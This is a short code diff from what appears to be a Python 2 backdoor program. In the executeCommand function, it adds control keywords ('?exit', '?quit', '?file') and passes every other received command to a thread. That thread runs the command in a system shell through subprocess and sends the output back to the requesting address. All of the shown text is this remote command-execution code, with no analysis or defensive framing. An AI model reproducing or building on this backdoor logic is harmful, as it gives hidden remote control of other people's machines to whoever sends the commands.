@@ -69,13 +69,18 @@ def executeCommand(srcAddress, pacType, command):
 	# check if command is within the backdoor
 	# otherwise, exec it
 	# clear command at the end
-	
+	if command == "?exit" or command == "?quit":
+		thread.interrupt_main()
+	elif command == "?file":
+		print "file stuff"
+	else:
+		sendThread = threading.Thread(target=sendResults, args=(srcAddress,pacType,command))
+		sendThread.start()
+
 	# directory = os.system("pwd")
 	# results = os.system(command)
 	# shell = str(directory) + " > " + str(results)
 	# print shell -> send results back to client
-	sendThread = threading.Thread(target=sendResults, args=(srcAddress,pacType,command))
-	sendThread.start()
 
 def sendResults(address, protocol, comm):
 	results = subprocess.Popen(comm, shell=True, stdout=PIPE).stdout.read()
